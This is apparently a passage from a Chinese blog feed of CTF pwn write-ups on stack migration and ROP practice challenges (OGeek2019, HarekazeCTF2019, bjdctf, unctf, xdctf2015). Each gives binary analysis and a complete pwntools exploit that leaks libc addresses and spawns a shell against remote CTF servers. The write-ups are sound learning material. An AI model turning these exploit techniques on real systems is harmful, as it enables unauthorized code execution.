src="https://s2.ax1x.com/2020/02/11/1ogwEq.jpg" srcset="/img/loading.gif" alt="1ogwEq.jpg"><br>计算一下，可以填入多少的可控字段。去除一下刚刚程序不能存入的部分和padding部分，还有80个字节可以用。其中一个来伪造new esp，剩下也就还有9个gadget可以用，可以给我构造第一个rop链。</p><h4 id="图解分析"><a href="#图解分析" class="headerlink" title="图解分析"></a>图解分析</h4><p>假设我们已经填入了溢出字符，buf1即为我们要去的新栈，这个选择bss段的后一半：<br><img src="https://s2.ax1x.com/2020/02/11/1ogabn.jpg" srcset="/img/loading.gif" alt="1ogabn.jpg"><br>开始执行一下leave 中的<code>mov rsp,rbp</code>：<br><img src="https://s2.ax1x.com/2020/02/11/1ogUDs.jpg" srcset="/img/loading.gif" alt="1ogUDs.jpg"><br>此时rsp 也指向了 rbp指向的位置，在执行leave中的<code>pop rbp</code>:<br><img src="https://s2.ax1x.com/2020/02/11/1ocMfU.jpg" srcset="/img/loading.gif" alt="1ocMfU.jpg"><br>此时rbp已经到了我们伪造的新栈buf1，然后开始执行ret,进入执行pop_rdi的gadget:<br><img src="https://s2.ax1x.com/2020/02/11/1ocZmn.jpg" srcset="/img/loading.gif" alt="1ocZmn.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1ocklQ.jpg" srcset="/img/loading.gif" alt="1ocklQ.jpg"></p><p>此时已经将buf1的地址，推入rdi，作为gets的参数，执行gets函数后，我们就可以往buf1上填入我们的rop链，此时栈大小已经没有限制了，可以任意写。<br><img src="https://s2.ax1x.com/2020/02/11/1o6oo6.jpg" srcset="/img/loading.gif" alt="1o6oo6.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6gWF.jpg" srcset="/img/loading.gif" alt="1o6gWF.jpg"><br>在这个buf1的栈空间里，我们需要先把rbp指向的位置写入buf2（下一个构造的新栈），然后构造rop链把puts的内存地址给泄露出来，进而可以算出libc的基地址，接着再构造一个gets函数。接着是执行一下leave 的gadget：<br><img src="https://s2.ax1x.com/2020/02/11/1o60Ln.jpg" srcset="/img/loading.gif" alt="1o60Ln.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6NRg.jpg" srcset="/img/loading.gif" alt="1o6NRg.jpg"><br>执行完以后就可以发现我们，已经完全控制了栈。并且开了一个buf2的新栈，留着在buf1调用gets函数时来在buf2新栈中摆上调用system(/bin/sh)函数的rop链。然后继续执行：<br><img src="https://s2.ax1x.com/2020/02/11/1o6tJS.jpg" srcset="/img/loading.gif" alt="1o6tJS.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6Yi8.jpg" srcset="/img/loading.gif" alt="1o6Yi8.jpg"><br>这就泄露出了puts函数的内存地址。接着开始往buf2新栈上读rop链:<br><img src="https://s2.ax1x.com/2020/02/11/1o6lqI.jpg" srcset="/img/loading.gif" alt="1o6lqI.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6QsA.jpg" srcset="/img/loading.gif" alt="1o6QsA.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6VIK.jpg" srcset="/img/loading.gif" alt="1o6VIK.jpg"><br>读入完成，接着再次执行leave的gadget：<br><img src="https://s2.ax1x.com/2020/02/11/1o6AVx.jpg" srcset="/img/loading.gif" alt="1o6AVx.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1oyk4S.jpg" srcset="/img/loading.gif" alt="1oyk4S.jpg"><br>可以看到esp到了新栈，rbp因为刚刚在buf2填入的buf1，又会到了buf1，这个地址可以随便填了，对做题不影响，填写这个只是可以看到再次栈转移。接着执行buf2新栈的rop链：<br><img src="https://s2.ax1x.com/2020/02/11/1os600.jpg" srcset="/img/loading.gif" alt="1os600.jpg"><br>就可以拿到shell了。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>借着这个思路就可以开始写exp:</p><pre><code>from pwn import *import timecontext.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;e = ELF(&#39;./test&#39;)l = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.23.so&#39;) # io = remote(&#39;127.0.0.1&#39;,4000)io = process(&#39;./test&#39;)pop_rdi_ret = 0x400703pop_rsi_r15_ret= 0x0400701pop_rdx_ret= 0x0400724leave_ret= 0x0400699buf1 = 0x00602000 - 0x200buf2 = buf1 + 0x100padding = 56 - 8puts_plt = e.symbols[&#39;puts&#39;]puts_got = e.got[&#39;puts&#39;]read_add = e.symbols[&#39;read&#39;]io.recvuntil(&#39;:&#39;)p = &#39;a&#39;*padding + flat([buf1,pop_rdi_ret,0,pop_rsi_r15_ret,buf1,0,pop_rdx_ret,0x100,read_add,leave_ret])#raw_input(&#39;-&gt;&#39;)io.send(p)sleep(0.1)p = flat([buf2,pop_rdi_ret,puts_got,puts_plt,pop_rdi_ret,0,pop_rsi_r15_ret,buf2,0,pop_rdx_ret,0x100,read_add,leave_ret])sleep(0.1)#raw_input(&#39;-&gt;&#39;)io.sendline(p)io.recvuntil(&#39;\n&#39;)puts = u64((io.recv(6)).ljust(8,&#39;\x00&#39;))libc = puts - l.symbols[&#39;puts&#39;]print(&#39;libc_base:&#39; + hex(libc))binsh_add = l.search(&#39;/bin/sh\x00&#39;).next() + libc#print(binsh_add)# raw_input(&#39;-&gt;&#39;)system_add = l.symbols[&#39;system&#39;] + libcp = flat([buf1,pop_rdi_ret,binsh_add,system_add])sleep(0.1)io.sendline(p)io.interactive()</code></pre><h3 id="Hgame2020-week2-rop-level2"><a href="#Hgame2020-week2-rop-level2" class="headerlink" title="Hgame2020_week2_rop_level2"></a>Hgame2020_week2_rop_level2</h3><h4 id="查保护和arch-1"><a href="#查保护和arch-1" class="headerlink" title="查保护和arch"></a>查保护和arch</h4><p><img src="https://s2.ax1x.com/2020/02/11/1os8OI.jpg" srcset="/img/loading.gif" alt="1os8OI.jpg"><br>32位程序，开了nx保护</p><h4 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h4><p><img src="https://s2.ax1x.com/2020/02/11/1osEO1.md.jpg" srcset="/img/loading.gif" alt="1osEO1.md.jpg"><br>这个明显的栈溢出，但是0x60-0x50-0x8 = 8。发现只有一个gadget位置，无法构造我们想要的rop链。但是前面的第一个read函数，可以读入很大空间，并且第二个参数buf的地址是固定的。<br><img src="https://s2.ax1x.com/2020/02/11/1orMMn.jpg" srcset="/img/loading.gif" alt="1orMMn.jpg"><br>那这个题明显就是可以Stack Migration来解决问题了，并且只需再写一个leave ret就控制栈了。</p><h5 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h5><p>程序中有着open，read，puts函数，我们可以写一个rop链，调用open函数，控制其参数是<code>./flag</code>，并在gdb中调试将其返回的文件fd号记录下来，然后传递给read函数，让其读入文件内容存入某个缓冲区，再用puts函数输出一下flag文件的内容即可。在第一个read的时候，我们就需要写好rop链。然后在最后一个read函数时，控制好ebp指向我们的新栈。</p><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><pre><code>from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;# io = process(&#39;./ROP&#39;)io = remote(&#39;47.103.214.163&#39;,20300)e = ELF(&#39;./ROP&#39;)buf = 0x06010A0# libc = e.libcpadding = 80leave_ret = 0x040090dpop_rdi_ret = 0x00400a43pop_rsi_r15 = 0x00400a41open_plt = 0x4007b0read_plt = 0x400780puts_plt = 0x400760io.recvuntil(&#39;think so?\n&#39;)p = flat([&#39;./flag\x00\x00&#39;,pop_rdi_ret,buf,pop_rsi_r15,0,0,open_plt,pop_rdi_ret,4,pop_rsi_r15,buf+0x80,0,read_plt,pop_rdi_ret,buf+0x80,puts_plt])io.sendline(p)io.recvuntil(&#39;\n&#39;)p = padding * &#39;a&#39; + p64(buf) + p64(leave_ret)raw_input(&#39;-&gt;&#39;) #手动下一个断点，以后让gdb附加上进行调试io.send(p)flag = io.recvline_contains(&#39;hgame&#39;)print(flag)io.interactive()</code></pre><p>我们跟着exp来调试一下，看看效果：<br><img src="https://s2.ax1x.com/2020/02/11/1or3ZV.jpg" srcset="/img/loading.gif" alt="1or3ZV.jpg"><br>此时的esp是我们伪造的new esp，已经指向了我们的目标位置，并且第一个rop链接已经送过去，可以看到<code>./flag</code>的字眼。执行一下leave：<br><img src="https://s2.ax1x.com/2020/02/11/1orGIU.jpg" srcset="/img/loading.gif" alt="1orGIU.jpg"><br>可以看到rbp的值已经等于我们伪造的值，esp还在原来栈上。接着执行ret，进入下一个leave ret：<br><img src="https://s2.ax1x.com/2020/02/11/1orQrq.jpg" srcset="/img/loading.gif" alt="1orQrq.jpg"><br>先记录下当前的状态，开始执行leave：<br><img src="https://s2.ax1x.com/2020/02/11/1or8aT.jpg" srcset="/img/loading.gif" alt="1or8aT.jpg"><br>执行完发现esp已经到达了新栈buf+8的位置，此时的栈帧已经是我们完全想要的，已经劫持了程序流程，并且新栈空间很大，可以满足我们的需求。ebp是多少已经不重要了，我们直接填入<code>./flag</code>，这个固定地址也做为给open函数做参数。<br><img src="https://s2.ax1x.com/2020/02/11/1ormGQ.jpg" srcset="/img/loading.gif" alt="1ormGQ.jpg"><br>在调试的时候，执行完open函数需要把返回的fd值记录下，给read函数做参数。最后由puts函数在输出flag：<br><img src="https://s2.ax1x.com/2020/02/11/1oDzPe.jpg" srcset="/img/loading.gif" alt="1oDzPe.jpg"></p><h3 id="Stack-Migration小总结"><a href="#Stack-Migration小总结" class="headerlink" title="Stack Migration小总结"></a>Stack Migration小总结</h3><p> 这下可以总结下利用思路也就是</p><ul><li>把控好起初栈的ebp，在里面写入需要伪造的new esp</li><li>在之后的可利用字节中写入leave gadget</li><li>将想执行的ROP Chain写在已知固定位置上</li><li>再利用leave搬移Stack位置到已知位置</li><li>然后无限接ROP Chain</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;花式栈溢出（栈帧的调节）&quot;&gt;&lt;a href=&quot;#花式栈溢出（栈帧的调节）&quot; class=&quot;headerlink&quot; title=&quot;花式栈溢出（栈帧的调节）&quot;&gt;&lt;/a&gt;花式栈溢出（栈帧的调节）&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="学习记录" scheme="http://chumen77.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="Stack Migration" scheme="http://chumen77.xyz/tags/Stack-Migration/"/>
    
  </entry>
  
  <entry>
    <title>ROP题目练习</title>
    <link href="http://chumen77.xyz/2020/02/03/ROP%E7%BB%83%E4%B9%A0/"/>
    <id>http://chumen77.xyz/2020/02/03/ROP练习/</id>
    <published>2020-02-03T08:21:13.000Z</published>
    <updated>2020-02-28T07:52:13.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ROP题目练习"><a href="#ROP题目练习" class="headerlink" title="ROP题目练习"></a>ROP题目练习</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在学习栈溢出，做了一些ROP的练习题，基本都是buuoj的题目，搜索rop字眼找的rop题。简单记录一下收获和exp。</p><h1 id="有libc（或者无libc可做）"><a href="#有libc（或者无libc可做）" class="headerlink" title="有libc（或者无libc可做）"></a>有libc（或者无libc可做）</h1><h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="OGeek2019_babyrop"></a>OGeek2019_babyrop</h2><h3 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><p><img src="/2020/02/03/ROP练习/images/15807186229840.jpg" srcset="/img/loading.gif" alt="-w621"><br>32位程序，开启NX堆栈不可执行。</p><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/2020/02/03/ROP练习/images/15807186890200.jpg" srcset="/img/loading.gif" alt="-w373"><br>可以看出其取了一个随机数，存入buf。<br><img src="/2020/02/03/ROP练习/images/15807187726931.jpg" srcset="/img/loading.gif" alt="-w413"><br>然后进入这个函数分析，看到接收buf传来的值，放入s中。然后下面接收你传入的东西，与s判断是否相同，不相同就会退出。然后如果不退出返回值是v5，但是这里的v5在函数中是没有经过处理的。看一下汇编：<br><img src="/2020/02/03/ROP练习/images/15807191082469.jpg" srcset="/img/loading.gif" alt="-w508"><br>v5咱们想控制，就只能通过原来那个read函数，咱们传入的值去控制。返回值给v2，然后v2作为参数然后进入下面这个带有溢出的函数中。<br> <img src="/2020/02/03/ROP练习/images/15807191871406.jpg" srcset="/img/loading.gif" alt="-w375"><br>观察后，可以看出咱们应该把这个返回的参数整的大一点，方便进行写ROP链。</p><h4 id="分析总结"><a href="#分析总结" class="headerlink" title="分析总结"></a>分析总结</h4><p>其中对于绕过相等判断，可以利用一下strlen函数的特性，然后直接用<code>\x00</code>来截断。<br>v5这个返回参数可以控制为’\xff’,然后进入带有溢出的函数，写rop链就行了。<br>先用puts函数泄露出<code>__libc_start_main</code>的地址，然后在给的libc中确认下symbols，然后拿到libc基址，然后直接利用one gadget RCE即可。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import time# io = process(&#39;./pwn&#39;)io = remote(&#39;node3.buuoj.cn&#39;,27780)libc = ELF(&#39;./libc-2.23.so&#39;)# blibc = ELF(&#39;/lib/i386-linux-gnu/libc-2.23.so&#39;)elf = ELF(&#39;./pwn&#39;)# raw_input(&#39;-&gt;&#39;)p1 = &#39;\x00&#39;.ljust(8,&#39;\xff&#39;) offset = 0xe7 + 4io.send(p1 + &#39;\n&#39;)io.recvline_contains(&#39;Correct&#39;)start_add=0x080485A0put_add = elf.symbols[&#39;puts&#39;]libc_start_add = elf.got[&#39;__libc_start_main&#39;]rop1 = [    put_add,    start_add,    libc_start_add]p2 = offset * &#39;\x00&#39; + &#39;&#39;.join(map(p32,rop1))io.sendline(p2)sleep(1)libc_base = u32(io.recv(4)) - libc.symbols[&#39;__libc_start_main&#39;]REC = libc_base+0x3a80cprint(&#39;libc_base :&#39;+hex(libc_base))offset = 0xe7 + 4io.send(p1 + &#39;\n&#39;)io.recvline_contains(&#39;Correct&#39;)p3 = offset * &#39;\x00&#39; + p32(REC)io.sendline(p3)io.interactive()</code></pre><h2 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="HarekazeCTF2019_baby_rop"></a>HarekazeCTF2019_baby_rop</h2><h3 id="查保护和arch-1"><a href="#查保护和arch-1" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><p><img src="/2020/02/03/ROP练习/images/15807395869628.jpg" srcset="/img/loading.gif" alt="-w624"></p><h3 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code>int __cdecl main(int argc, const char **argv, const char **envp){  char v4; // [rsp+0h] [rbp-10h]  system(&quot;echo -n \&quot;What&#39;s your name? \&quot;&quot;);  __isoc99_scanf(&quot;%s&quot;, &amp;v4);  printf(&quot;Welcome to the Pwn World, %s!\n&quot;, &amp;v4);  return 0;}</code></pre><p>程序十分简单，给了system函数，且明显存在溢出。<br><img src="/2020/02/03/ROP练习/images/15807396970009.jpg" srcset="/img/loading.gif" alt="-w502"><br>ida查看字符串，该可以发现<code>/bin/sh</code>/，这构造个简单rop链直接利用就好了。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *import time# io = process(&#39;./babyrop&#39;)io = remote(&#39;node3.buuoj.cn&#39;,28633)elf = ELF(&#39;./babyrop&#39;)offset = 0x10 + 8binsh_add = 0x0601048pop_rdi_ret=0x000400683 system_add = elf.symbols[&#39;system&#39;]# io.recvline_contains(&#39;your&#39;)# raw_input(&#39;-&gt;&#39;)p = &#39;a&#39; * offset + p64(pop_rdi_ret) + p64(binsh_add) + p64(system_add)io.sendline(p)io.interactive()</code></pre><p>拿到shell后，这个题buuctf根目录下没有flag文件。需要<code>find / -name &quot;flag&quot;</code> 可以查到是在<code>/home/babyrop/flag</code>这个目录下。</p><h2 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="HarekazeCTF2019_baby_rop2"></a>HarekazeCTF2019_baby_rop2</h2><h3 id="查保护和arch-2"><a href="#查保护和arch-2" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><p><img src="/2020/02/03/ROP练习/images/15808200972779.jpg" srcset="/img/loading.gif" alt="-w310"></p><h3 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/2020/02/03/ROP练习/images/15808200578822.jpg" srcset="/img/loading.gif" alt="-w577"><br>函数过程很简单，明显栈溢出，思路就是先栈溢出构造rop链，让pintf函数打印出<code>__libc_start_main</code>函数在内存的地址，然后在给的libc文件中获取一下其sympol是的值，然后再计算出它的基址，再让函数返回到shart处清理一下栈，然后再次利用onegadget RCE构造相关rop链即可。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *import timeio = process(&#39;./babyrop2&#39;)# blibc = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.23.so&#39;)# context.log_level = &#39;debug&#39;libc = ELF(&#39;./libc.so.6&#39;)io = remote(&#39;node3.buuoj.cn&#39;,27694)elf = ELF(&#39;./babyrop2&#39;)offset = 40__libc_start_add = elf.got[&#39;__libc_start_main&#39;]start_add = 0x0400540 printf_add = elf.symbols[&#39;printf&#39;]aWelcomeToThePw = 0x400770 pop_rdi_ret= 0x000400733pop_rsi_r15_ret = 0x00400731 libc_start_sys = libc.symbols[&#39;__libc_start_main&#39;]rop1 = [    pop_rdi_ret,    aWelcomeToThePw,    pop_rsi_r15_ret,    __libc_start_add,    0,    printf_add,    start_add]io.recvuntil(&#39;e? &#39;)# io.recvuntil(&#39;again, &#39;)# raw_input(&#39;-&gt;&#39;)p = &#39;a&#39; * offset + &#39;&#39;.join(map(p64,rop1))io.sendline(p)io.recvline_contains(&#39;again&#39;)s = io.recvline_contains(&#39;again&#39;)libc_base = int(u64(s[32:38].ljust(8,&#39;\x00&#39;))) - libc_start_sysRCE = libc_base + 0x4526aprint(&#39;libc_base:&#39;+hex(libc_base))io.recvuntil(&#39;name? &#39;)# io.recvuntil(&#39;name? &#39;)p = &#39;\x00&#39; * offset + p64(RCE) + &#39;\x00&#39; * 70sleep(1)raw_input(&#39;-&gt;&#39;)io.sendline(p)io.interactive()</code></pre><h1 id="无libc"><a href="#无libc" class="headerlink" title="无libc"></a>无libc</h1><p>这一部分目前主要是利用LibcSearcher来做的，有时候题目不给libc，用这个也可以解决部分题目。~~用这个以后就不能很方便的用onegadget去一键拿shell了，感觉还是有办法的，想办法拿到LibcSearcher获取到的libc版本就好了，找个时间去实践一下，先慢慢构建rop链就好，正好练习一下这种方法拿shell。~~<br>已经测试出办法咯。<br><code>https://github.com/lieanu/LibcSearcher</code></p><h2 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h2><h3 id="查保护和arch-3"><a href="#查保护和arch-3" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><p><img src="/2020/02/03/ROP练习/images/15808195388315.jpg" srcset="/img/loading.gif" alt="-w408"></p><h3 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/2020/02/03/ROP练习/images/15808195745508.jpg" srcset="/img/loading.gif" alt="-w436"><br>函数十分简单，明显栈溢出，思路就是先栈溢出构造rop链，让puts函数打印出<code>__libc_start_main</code>函数的地址，然后再用libcsearcher来获取一下它的libc版本，然后再计算出它的基址，再让函数返回到最初清理一下栈，然后再次进行溢出构造关于<code>system(&#39;/bin/sh&#39;)</code>的rop链即可。</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *from LibcSearcher import *import time# context.log_level = &#39;debug&#39;io = remote(&#39;node3.buuoj.cn&#39;,28661)# io = process(&#39;./bjdctf_2020_babyrop&#39;)elf = ELF(&#39;./bjdctf_2020_babyrop&#39;)# blibc = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.23.so&#39;)io.recvuntil(&#39;story!\n&#39;)padding = 40libc_main_add = elf.got[&#39;__libc_start_main&#39;]puts_add = elf.symbols[&#39;puts&#39;]pop_rdi_ret = 0x0400733 p = &#39;a&#39;*padding + p64(pop_rdi_ret) + p64(libc_main_add) + p64(puts_add) + p64(0x400530)io.sendline(p)s = u64(io.recv(6).ljust(8,&#39;\x00&#39;))print(hex(s))obj = LibcSearcher(&quot;__libc_start_main&quot;,s)libc_base = s - obj.dump(&quot;__libc_start_main&quot;)system_add = libc_base + obj.dump(&quot;system&quot;)binsh_add = libc_base + obj.dump(&quot;str_bin_sh&quot;)sleep(1)io.recvuntil(&#39;story!\n&#39;)p = &#39;a&#39;*padding + p64(pop_rdi_ret) + p64(binsh_add) + p64(system_add)io.sendline(p)io.interactive()</code></pre><h2 id="unctf-easyrop"><a href="#unctf-easyrop" class="headerlink" title="unctf_easyrop"></a>unctf_easyrop</h2><h3 id="查保护和arch-4"><a href="#查保护和arch-4" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><p><img src="/2020/02/03/ROP练习/images/15808809043718.jpg" srcset="/img/loading.gif" alt="-w432"></p><h3 id="ida分析-4"><a href="#ida分析-4" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/2020/02/03/ROP练习/images/15808809641958.jpg" srcset="/img/loading.gif" alt="-w397"><br>主程序主要就是限制了v2需要等于<code>ffff</code>才能进入带有溢出的函数，v2的值是<br><img src="/2020/02/03/ROP练习/images/15808810282809.jpg" srcset="/img/loading.gif" alt="-w381"><br>这个在read的时候把控好，让ffff填入这个位置即可。<br><img src="/2020/02/03/ROP练习/images/15808811265759.jpg" srcset="/img/loading.gif" alt="-w407"><br>然后进入这个带有溢出漏洞的函数，可以看到buf的首地址是<code>ebp-0x10</code>，<img src="/2020/02/03/ROP练习/images/15808812877029.jpg" srcset="/img/loading.gif" alt="-w478"><br>然后分析下这里的汇编，它把read函数的溢出位置返回值<code>ebp-0x14</code>取出来，与<code>0x8050000</code>进行比较。<br><img src="/2020/02/03/ROP练习/images/15808814707476.jpg" srcset="/img/loading.gif" alt="-w385"><br>也可以看出，这里是防止我们进行ret2libc的。那我们构造这里可以用一个ret来进行绕过。</p><h4 id="思路总结"><a href="#思路总结" class="headerlink" title="思路总结"></a>思路总结</h4><p>先控制好v2让其等于<code>ffff</code>，然后进入带有溢出的函数，然后构造rop链，先把<code>__libc_start_main</code>的内存地址泄露出来，然后用libcseacher来确定libc版本，<br>然后dump出<code>__libc_start_main的sympols</code>,算出基址后，接着返回到开始处清理一下栈，再次溢出跟原来一样。然后再次构造rop链的时候，注意ret绕过对咱们溢出地址的检测，在调用system(‘/bin/sh’)即可。</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *from LibcSearcher import *import time# context.log_level = &#39;debug&#39;io = process(&#39;./easyrop&#39;)# io = remote(&#39;183.129.189.60&#39;,10011)io.recvuntil(&#39;TFer!\n&#39;)e =ELF(&#39;./easyrop&#39;)raw_input(&#39;-&gt;&#39;)padding = 36start_add = 0x08048400libc_start_main = e.got[&#39;__libc_start_main&#39;]puts_add = e.symbols[&#39;puts&#39;]ret = 0x0804839ep = &#39;f&#39; * paddingrop1 = [    puts_add,    start_add,    libc_start_main]io.sendline(p)io.recvuntil(&#39;name?\n&#39;)p = &#39;\x00&#39; * 0x18 + &#39;&#39;.join(map(p32,rop1))raw_input(&#39;&gt;&#39;)io.sendline(p)libc_start_add = u32(io.recv(4))obj = LibcSearcher(&quot;__libc_start_main&quot;,libc_start_add)libc_base = libc_start_add - obj.dump(&quot;__libc_start_main&quot;)print(libc_base)system_add = obj.dump(&#39;system&#39;) + libc_basebinsh_add = obj.dump(&#39;str_bin_sh&#39;) + libc_baseio.recvuntil(&#39;TFer!\n&#39;)p = &#39;f&#39; * paddingio.sendline(p)io.recvuntil(&#39;name?\n&#39;)rop2 = [    ret,    system_add,    start_add,    binsh_add]p = &#39;\x00&#39; * 0x14 + &#39;&#39;.join(map(p32,rop2))sleep(1)io.sendline(p)io.interactive()</code></pre><h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><h3 id="查保护和arch-5"><a href="#查保护和arch-5" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><p><img src="/2020/02/03/ROP练习/images/15813386440906.jpg" srcset="/img/loading.gif" alt="-w512"><br>32位</p><h3 id="ida分析-5"><a href="#ida分析-5" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code>int __cdecl main(int argc, const char **argv, const char **envp){  be_nice_to_people();  vulnerable_function();  return write(1, &quot;Hello, World\n&quot;, 0xDu);}</code></pre><p>主函数很简单，漏洞函数是在第二个函数。<br><img src="/2020/02/03/ROP练习/images/15813387437739.jpg" srcset="/img/loading.gif" alt="-w344"><br>栈溢出，然后直接构造rop链即可。<br><img src="/2020/02/03/ROP练习/images/15813388677907.jpg" srcset="/img/loading.gif" alt="-w322"><br>利用思路：用wirte函数泄露出<code>__libc_start_main</code>在内存地址，然后返回start清理一下栈，用libcseacher确定下libc版本，然后进行构造system(‘/bin/sh’)的rop链即可。</p><p>这个我是发现可以用libcseacher确定libc版本后，用one_gadget工具计算RCE位置，然后实现ret to RCE。libcseacher获取到leak地址后，在执行dump libc前的时候，会告诉你，它确定的libc版本号是多少。<br><img src="/2020/02/03/ROP练习/images/15813393524855.jpg" srcset="/img/loading.gif" alt="-w1217"><br>这个是让你选择的。<br><img src="/2020/02/03/ROP练习/images/15813394033522.jpg" srcset="/img/loading.gif" alt="-w826"></p><p><img src="/2020/02/03/ROP练习/images/15813392212443.jpg" srcset="/img/loading.gif" alt="-w1200"><br>在下载的libcseacher时候，其实它是有个数据库的，这里面存着各种libc版本，方便咱们使用。那这个时候，直接用one_gadget 计算下RCE偏移即可。<br><img src="/2020/02/03/ROP练习/images/15813395195579.jpg" srcset="/img/loading.gif" alt="-w1030"></p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *from LibcSearcher import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;elf = ELF(&#39;./2018_rop&#39;)# io = process(&#39;./2018_rop&#39;)io = remote(&#39;node3.buuoj.cn&#39;,29692)padding = 140 write_plt = elf.symbols[&#39;write&#39;]libc_start_main_got = elf.got[&#39;__libc_start_main&#39;]start = 0x080483C0 p = padding * &#39;\x00&#39; + flat([write_plt,start,1,libc_start_main_got,0x10])# raw_input(&#39;-&gt;&#39;)io.sendline(p)libc_start_main_add = u32(io.recv(4))obj = LibcSearcher(&#39;__libc_start_main&#39;,libc_start_main_add)libc_base = libc_start_main_add - obj.dump(&#39;__libc_start_main&#39;)system_add = libc_base + obj.dump(&#39;system&#39;)binsh_add = libc_base + obj.dump(&#39;str_bin_sh&#39;)# print(libc.symbols[&#39;__libc_start_main&#39;])print(hex(libc_base))# io.recvline()RCE = libc_base + 0x3cbecp = padding * &#39;\x00&#39; + p32(RCE) + padding * &#39;\x00&#39;# p = padding * &#39;\x00&#39; + p32(system_add) + p32(start) + p32(binsh_add)io.sendline(p)io.interactive()</code></pre><p>这里面两种办法都行。</p><h2 id="xdctf2015-pwn200"><a href="#xdctf2015-pwn200" class="headerlink" title="xdctf2015_pwn200"></a>xdctf2015_pwn200</h2><h3 id="查保护和arch-6"><a href="#查保护和arch-6" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><pre><code> Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="ida分析-6"><a href="#ida分析-6" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/2020/02/03/ROP练习/images/15814340991655.jpg" srcset="/img/loading.gif" alt="-w601"><br>主函数十分简单，漏洞在vuln函数：<br><img src="/2020/02/03/ROP练习/images/15814341281175.jpg" srcset="/img/loading.gif" alt="-w389"><br>padding为 6c+4 个字节。跟上题很像的攻击思路，直接给exp了。</p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *from LibcSearcher import *# io = process(&#39;./bof&#39;)io = remote(&#39;node3.buuoj.cn&#39;,27178)elf = ELF(&#39;./bof&#39;)libc = elf.libccontext.arch = &#39;i386&#39;context.log_level = &#39;debug&#39;padding = 112start_add = 0x080483E0libc_start_main_got = elf.got[&#39;__libc_start_main&#39;]write_plt = elf.symbols[&#39;write&#39;]io.recvuntil(&#39;2015~!\n&#39;)p = padding * &#39;\x00&#39; + flat([write_plt,start_add,1,libc_start_main_got,0x10])io.sendline(p)libc_start_main_add = u32(io.recv(4))obj = LibcSearcher(&#39;__libc_start_main&#39;,libc_start_main_add)libc_base = libc_start_main_add - obj.dump(&#39;__libc_start_main&#39;)print(hex(libc_start_main_add))print(hex(libc_base))io.recvuntil(&#39;2015~!\n&#39;)rce = libc_base + 0x3a80cp = padding * &#39;\x00&#39; + p32(rce) + padding * &#39;\x00&#39;io.sendline(p)io.interactive()</code></pre><p>还是本地来base库查libc的one_gadget，然后ret to rce。</p>]]></content>
    
    <summary type="html">
    
      
      
